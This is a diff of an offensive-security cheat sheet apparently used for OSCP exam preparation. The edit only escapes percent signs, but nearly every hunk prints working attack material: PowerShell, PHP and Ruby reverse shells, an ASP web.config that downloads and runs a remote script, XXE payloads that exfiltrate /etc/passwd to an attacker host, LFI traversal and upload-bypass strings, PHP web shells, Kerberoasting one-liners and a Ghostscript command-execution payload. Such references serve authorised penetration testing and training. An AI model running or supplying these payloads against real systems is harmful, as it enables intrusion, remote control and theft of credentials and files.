@@ -405,7 +405,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
-| n/a | StorSvc LPE | "https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc" |
+| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE\%20via\%20StorSvc |
 | n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
 | n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
 | n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
@@ -446,7 +446,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | phpgcc | https://github.com/ambionics/phpggc |
 | PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
 | PowerLine | https://github.com/fullmetalcache/powerline |
-| PowerShell Encoder (CyberChef) | [Receipe for encoding PowerShell Payloads for Windows]("https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')") |
+| PowerShell Encoder (CyberChef) | [Receipe for encoding PowerShell Payloads for Windows](https://cyberchef.io/#recipe=Encode_text('UTF-16LE\%20(1200)')To_Base64('A-Za-z0-9\%2B/\%3D')) |
 | Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
 | ScareCrow | https://github.com/optiv/ScareCrow |
 | Shikata Ga Nai | https://github.com/EgeBalci/sgn |
@@ -557,7 +557,7 @@ function __wget() {
     local mark=0
 
     if [ -z "${URL}" ]; then
-        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
+        printf "Usage: \%s \"URL\" [e.g.: \%s http://www.google.com/]" \
                "${FUNCNAME[0]}" "${FUNCNAME[0]}"
         return 1;
     fi
@@ -732,7 +732,7 @@ iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
 ##### vi
 
 ```c
-:w !sudo tee %    # save file with elevated privileges without exiting
+:w !sudo tee \%    # save file with elevated privileges without exiting
 ```
 
 ##### Windows Command Formatting
@@ -793,8 +793,8 @@ smbclient -L \\<RHOST>\ -N
 smbclient -L //<RHOST>/ -N
 smbclient -L ////<RHOST>/ -N
 smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
-smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
-smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
+smbclient -L //<RHOST>// -U <USERNAME>\%<PASSWORD>
+smbclient //<RHOST>/SYSVOL -U <USERNAME>\%<PASSWORD>
 smbclient "\\\\<RHOST>\<SHARE>"
 smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
 smbclient --no-pass //<RHOST>/<SHARE>
@@ -903,7 +903,7 @@ while [ 1 ]; do sudo ntpdate <RHOST>;done
 ```c
 ctrl b + w    # show windows
 ctrl + "      # split window horizontal
-ctrl + %      # split window vertical
+ctrl + \%      # split window vertical
 ctrl + ,      # rename window
 ctrl + {      # flip window
 ctrl + }      # flip window
@@ -1249,13 +1249,13 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 ##### Until php 5.3
 
 ```c
-http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
+http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd\%00
 ```
 
 ##### Null Byte
 
 ```c
-%00
+\%00
 0x00
 ```
 
@@ -1265,11 +1265,11 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ../
 ..\
 ..\/
-%2e%2e%2f
-%252e%252e%252f
-%c0%ae%c0%ae%c0%af
-%uff0e%uff0e%u2215
-%uff0e%uff0e%u2216
+\%2e\%2e\%2f
+\%252e\%252e\%252f
+\%c0\%ae\%c0\%ae\%c0\%af
+\%uff0e\%uff0e\%u2215
+\%uff0e\%uff0e\%u2216
 ..././
 ...\.\
 ```
@@ -1278,9 +1278,9 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 
 > https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
 
-> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File\%20Inclusion
 
-> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
+> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File\%20Inclusion#wrapper-phpfilter
 
 ```c
 url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
@@ -1296,12 +1296,12 @@ base64 -d <FILE>.php
 
 ```c
 Accept: ../../../../.././../../../../etc/passwd{{
-Accept: ../../../../.././../../../../etc/passwd{%0D
-Accept: ../../../../.././../../../../etc/passwd{%0A
-Accept: ../../../../.././../../../../etc/passwd{%00
-Accept: ../../../../.././../../../../etc/passwd{%0D{{
-Accept: ../../../../.././../../../../etc/passwd{%0A{{
-Accept: ../../../../.././../../../../etc/passwd{%00{{
+Accept: ../../../../.././../../../../etc/passwd{\%0D
+Accept: ../../../../.././../../../../etc/passwd{\%0A
+Accept: ../../../../.././../../../../etc/passwd{\%00
+Accept: ../../../../.././../../../../etc/passwd{\%0D{{
+Accept: ../../../../.././../../../../etc/passwd{\%0A{{
+Accept: ../../../../.././../../../../etc/passwd{\%00{{
 ```
 
 ##### Linux Files
@@ -1659,7 +1659,7 @@ C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 Create a file with a PDF header, which contains PHP code.
 
 ```c
-%PDF-1.4
+\%PDF-1.4
 
 <?php
     system($_GET["cmd"]);
@@ -1667,7 +1667,7 @@ Create a file with a PDF header, which contains PHP code.
 ```
 
 ```c
-http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
+http://<RHOST>/index.php?page=uploads/<FILE>.pdf\%00&cmd=whoami
 ```
 
 #### PHP Upload Filter Bypasses
@@ -1692,19 +1692,19 @@ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
 .pgif
 .phtml
 .phtm
-.php%00.jpeg
+.php\%00.jpeg
 ```
 
 ```c
-<FILE>.php%20
-<FILE>.php%0d%0a.jpg
-<FILE>.php%0a
+<FILE>.php\%20
+<FILE>.php\%0d\%0a.jpg
+<FILE>.php\%0a
 <FILE>.php.jpg
-<FILE>.php%00.gif
+<FILE>.php\%00.gif
 <FILE>.php\x00.gif
-<FILE>.php%00.png
+<FILE>.php\%00.png
 <FILE>.php\x00.png
-<FILE>.php%00.jpg
+<FILE>.php\%00.jpg
 <FILE>.php\x00.jpg
 mv <FILE>.jpg <FILE>.php\x00.jpg
 ```
@@ -1750,7 +1750,7 @@ https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
 > https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
 
 ```c
-${{<%[%'"}}%\.
+${{<\%[\%'"}}\%\.
 ```
 
 ##### Magic Payload
@@ -1890,7 +1890,7 @@ Content-Length: 136
 ```
 
 ```c
-username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
+username=\%26username\%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
 ```
 
 ### Database Analysis
@@ -3025,8 +3025,8 @@ impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
 .\Rubeus.exe kerberoast /outfile:<FILE>
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
-Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
-Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
+Invoke-Kerberoast -OutputFormat hashcat | \% { $_.Hash } | Out-File -Encoding ASCII <FILE>
+Invoke-Kerberoast -OutputFormat john | \% { $_.Hash } | Out-File -Encoding ASCII <FILE>
 ```
 
 ##### Overpass The Hash/Pass The Key (PTK)
@@ -3085,7 +3085,7 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 grep default_ccache_name /etc/krb5.conf
 ```
 
-* If none return, default is FILE:/tmp/krb5cc_%{uid}
+* If none return, default is FILE:/tmp/krb5cc_\%{uid}
 * In Case of File Tickets it is possible to Copy-Paste them to use them
 * In Case of being KEYRING Tickets, the Tool tickey can be used to get them
 * To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
@@ -3710,7 +3710,7 @@ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 SET CONTEXT PERSISTENT NOWRITERSp
 add volume c: alias foobarp
 createp
-expose %foobar% z:p
+expose \%foobar\% z:p
 ```
 
 ```c
@@ -3749,7 +3749,7 @@ set context persistentX
 begin backupX
 add volume C: alias cdriveX
 createX
-expose %cdrive% E:X
+expose \%cdrive\% E:X
 end backupX
 ```
  
@@ -3839,7 +3839,7 @@ findstr /si password *.xml *.ini *.txt
 ###### PowerShell History
 
 ```c
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type \%userprofile\%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 ###### Saved Windows Credentials
@@ -4214,8 +4214,8 @@ smbpasswd -U <RHOST>\<USERNAME> -r <RHOST>
 #### winexe
 
 ```c
-winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
-winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
+winexe -U '<USERNAME\%PASSWORD>' //<RHOST> cmd.exe
+winexe -U '<USERNAME\%PASSWORD>' --system //<RHOST> cmd.exe
 ```
 
 ### CVE
@@ -4317,7 +4317,7 @@ from binascii import hexlify, unhexlify
 from subprocess import check_call
 
 # Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
-MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
+MAX_ATTEMPTS = 2000 # False negative chance: 0.04\%
 
 def fail(msg):
   print(msg, file=sys.stderr)
@@ -4762,7 +4762,7 @@ su
 
 > https://github.com/decoder-it/LocalPotato
 
-> https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc
+> https://github.com/blackarrowsec/redteam-research/tree/master/LPE\%20via\%20StorSvc
 
 Modify the following file and build the solution.
 
@@ -5044,15 +5044,15 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
 #### GhostScript
 
 ```c
-%!PS-Adobe-3.0 EPSF-3.0
-%%BoundingBox: -0 -0 100 100
+\%!PS-Adobe-3.0 EPSF-3.0
+\%\%BoundingBox: -0 -0 100 100
 userdict /setpagedevice undef
 save
 legal
 { null restore } stopped { pop } if
 { legal } stopped { pop } if
 restore
-mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
+mark /OutputFile (\%pipe\%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
 ```
 
 #### nishang
@@ -5175,15 +5175,15 @@ php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 ##### PowerShell Reverse Shell
 
 ```c
-$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|\%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 ```c
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|\%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 ```c
-powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|\%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 
 ##### minireverse.ps1
@@ -5266,7 +5266,7 @@ echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,sock
 ##### Ruby Reverse Shell
 
 ```c
-ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&\%d >&\%d 2>&\%d",f,f,f)'
 ```
 
 #### ScareCrow
@@ -5369,7 +5369,7 @@ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$f
 <configuration>
    <system.webServer>
       <handlers accessPolicy="Read, Script, Write">
-         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="\%windir\%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
       </handlers>
       <security>
          <requestFiltering>
@@ -5384,12 +5384,12 @@ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$f
    </system.webServer>
 </configuration>
 <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
-<%
+<\%
 Set s = CreateObject("WScript.Shell")
 Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
 o = cmd.StdOut.Readall()
 Response.write(o)
-%>
+\%>
 -->
 ```
 
@@ -5542,7 +5542,7 @@ def main():
     redirectHandler = redirect_handler_factory(redirect_url)
 
     handler = SocketServer.TCPServer((host, port), redirectHandler)
-    print("serving at port %s" % port)
+    print("serving at port \%s" \% port)
     handler.serve_forever()
 
 if __name__ == "__main__":
@@ -5571,8 +5571,8 @@ r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cook
 
 ```c
 <?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
-"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
+<!DOCTYPE foo [<!ENTITY \% <NAME> SYSTEM 
+"http://<LHOST>/<FILE>.dtd">\%<NAME>;]>
 <root>
 <method>GET</method>
 <uri>/</uri>
@@ -5586,8 +5586,8 @@ r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cook
 ##### Content of <FILE>.dtd
 
 ```c
-<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
-%eval;
-%exfiltrate;
+<!ENTITY \% file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY \% eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=\%file;'>">
+\%eval;
+\%exfiltrate;
 ```
